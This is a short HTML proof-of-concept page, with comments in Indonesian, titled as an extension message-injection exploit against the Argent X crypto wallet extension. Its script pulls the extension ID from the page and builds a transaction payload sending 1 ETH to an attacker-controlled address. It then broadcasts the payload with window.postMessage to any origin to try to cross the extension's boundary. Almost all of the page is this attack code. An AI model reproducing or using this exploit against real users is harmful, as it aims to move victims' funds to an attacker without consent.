<!DOCTYPE html>
<html>
<head>
    <title>Exploit PoC: Extension Message Injection</title>
</head>
<body>
    <h1>Security Test Interface</h1>
    <button id="trigger">Trigger Malicious Transaction</button>

    <script>
        // Skenario Nyata: Mengambil ID ekstensi dari atribut yang terekspos di DOM
        // Jika tidak muncul, Anda harus melakukan inspeksi manual di chrome://extensions
        const targetId = document.getElementById("argent-x-extension")?.getAttribute("data-extension-id");

        document.getElementById('trigger').addEventListener('click', () => {
            // Payload mengacu pada MessageType dari 1000163978.png
            const payload = {
                type: "TransactionMessage", // Target tipe pesan spesifik
                extensionId: targetId,
                params: {
                    to: "0xYourControlledAddressHere", // Alamat penyerang
                    amount: "1000000000000000000", // 1 ETH dalam Wei
                    data: "0x"
                },
                timestamp: Date.now()
            };

            // Mengirim ke target origin spesifik atau wildcard untuk mendeteksi leak
            // Skenario nyata: Menggunakan postMessage untuk memintas boundary ekstensi
            window.postMessage(payload, "*"); 
            
            console.log("Payload dikirim ke ekstensi:", payload);
        });
    </script>
</body>
</html>
